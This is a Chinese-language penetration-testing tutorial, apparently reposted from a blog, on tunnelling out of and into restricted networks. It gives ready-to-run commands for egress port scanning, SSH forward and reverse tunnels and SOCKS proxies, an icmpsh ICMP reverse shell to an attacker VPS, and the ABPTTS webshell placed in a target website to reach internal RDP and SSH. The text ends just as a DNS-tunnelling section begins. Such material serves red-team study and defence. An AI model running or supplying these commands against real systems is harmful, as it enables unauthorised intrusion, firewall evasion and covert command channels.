原文 by [RcoIl的窝](http://rcoil.me/2017/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B9%8B-%E4%BB%A3%E7%90%86%E7%AF%87/)  
服务器处于内网，可以访问外部网络。  
服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。  
服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。  
对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3种可以使用SOCKS代理。  
代理小技巧
## 判断什么端口能出来  
### VISTA 以下
* TCP
`FOR /L %i IN (1,1,65535) DO (cmd /c "start /b telnet 151.101.73.147 %i")`  
用 TELNET 不停的连接你的 1-65535 端口, 你本地开个 TCPDUMP 就行了, 如果连通了, 就 OK 。  
* UDP
`FOR /L %i IN (1,1,65535) DO (cmd /c "start /b nslookup -port=%i rcoil.me 151.101.73.147")`  
这个速度慢，但是有效。  
### VISTA 以后
* TCP
```
function sT($IP,$Port) {$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint $address, $port;$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork;$Stype = [System.Net.Sockets.SocketType]::Stream;$Ptype = [System.Net.Sockets.ProtocolType]::TCP;$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;try { $sock.Connect($End);[Byte[]] $Message = [char[]]"w00tw00t";$Sent = $Sock.Send($Message);$sock.EndConnect($Connect)} catch {};$Sock.Close();};1..65535 | %{ sT -IP "151.101.73.147" -Port $_ }
```
* UDP
```
function sU($IP, [int]$Port){$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint($Address, $port);$Saddrf=[System.Net.Sockets.AddressFamily]::InterNetwork;$Stype=[System.Net.Sockets.SocketType]::Dgram;$Ptype=[System.Net.Sockets.ProtocolType]::UDP;$Sock=New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;$sock.Connect($end);$Enc=[System.Text.Encoding]::ASCII;$Message = "w00tw00t";$Buffer=$Enc.GetBytes($Message);$Sent=$Sock.Send($Buffer);}; 1..65535 | %{ sU -IP "151.101.73.147" -Port $_ }
```
## SSH隧道
编辑/etc/ssh/sshd_config文件（服务器端）中：  
```
GatewayPorts yes
PermitRootLogin yes
PermitTunnel yes #Tunnel启用
ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,
ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次, 就自动断开
```
接着重启ssh服务  
参数详解：  
-q Quiet mode. 安静模式 
-T Disable pseudo-tty allocation. 不占用 shell 了  
-N：Do not execute a remote command. 不执行远程命令，端口转发就用它了。  
-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。  
-f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。并推荐加上 -n 参数    
-g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。   
-R：远程转发 
-L：本地转发  
-D：...  
### 端口转发
```
ssh -qTfnN -L hostport:host:port -l user remote_ip #正向隧道
ssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道
```
举个例子  
```
ssh -N -R 5555:192.168.2.100:5556 username@host  # 5555是本地端口，本地访问5555就是访问vps的5556。
ssh -N -R 5555:192.168.2.100:5556 username@host  # 5555是vps的端口，访问vps的5555就是访问本地的5556。
```
### 正向代理
```
SSH -qTfnN -D port remotehost #直接进行socks代理
ssh -qTfnN -D 6080 user@theserver #在本地终端中运行
``` 
然后在浏览器或者软件中设置好代理参数   
socks5: 127.0.0.1:6080 后便可以使用.  
-q：静默运行   
### 远程转发(反向)  
第一步：  
sudo python -m SimpleHTTPServer 80  
在目标机子开启80端口服务  
第二步：  
`ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS`  
这样就把目标本地的22端口转发到了远程机器（VPS）的6666端口  
第三步： 
个人PC机器直接使用语句:  
`ssh -p 6666 -qngfNTD 6767 内网用户@VPS`  
这样就可以直接穿透网络，进入到内网，本地机器直接使用SOCKS5代理127.0.0.1:6767便能够直接访问到目标内网当中  
## ICMP隧道
ICMP隧道是通过将任意数据注入发送到远程计算机的回送数据包来工作的。要判断是否能使用ICMP隧道，我们只需要关注一件事情：可以ping一个外部服务器。如果能到达外部网络，，那么很有可能可以建立一个icmp隧道。缺点是需要root/administrator权限。  
### icmpsh
vps上：    
```
git clone https://github.com/inquisb/icmpsh.git
apt-get install python-impacket
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207
```
靶机上：  
`icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128`  
就会在vps上接到一个cmdshell。  
## HTTP代理
### abptts
[项目地址](https://github.com/nccgroup/ABPTTS)    
首先,安装好工具所需的各种py依赖库:  
```
pip install pycrypto    加密库,整个数据加密都要靠这个  
pip install httplib2  
```
生成好服务端(webshell)，-o用来指定要生成到的目录，然后把生成好的对应类型的代理脚本扔到目标网站目录中，并尝试访问该脚本，如果返回了一段类似hash的数据,说明代理端执行正常,继续进行后面的步骤即可，如下:  
```
python abpttsfactory.py -o webshell
abppts_webshell
abppts_webshell_request
```
![](../pictures/porttransfer1.png)  
![](../pictures/porttransfer2.png)  
前面确认没有问题后,现在开始绑定端口，建立隧道，下面的意思就是把远端[目标机器]的3389端口和本地的1234端口进行绑定，-c用来指定webshell的配置文件[这里直接用默认的]，-u 指定webshell的url，关于更多选项用法，看下工具帮助就明白了，都非常简单的:  
`python abpttsclient.py -c webshell\config.txt -u "http://www.rcoil.com/abptts.aspx" -f 127.0.0.1:1234/127.0.0.1:3389`
隧道建立成功后，用相应的socks代理客户端工具[proxychains,sockscap……]连接到前面已经绑定好的本地端口[1234端口]，即可访问目标内网中的资源:  
```
mstsc 127.0.0.1:1234
putty ssh root@127.0.0.1 -p 1234 -i ~/.ssh/xxx/id_rsa  	如果对方的ssh只允许证书登录,加载上自己的证书即可
```
## DNS隧道
不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。  
### Iodine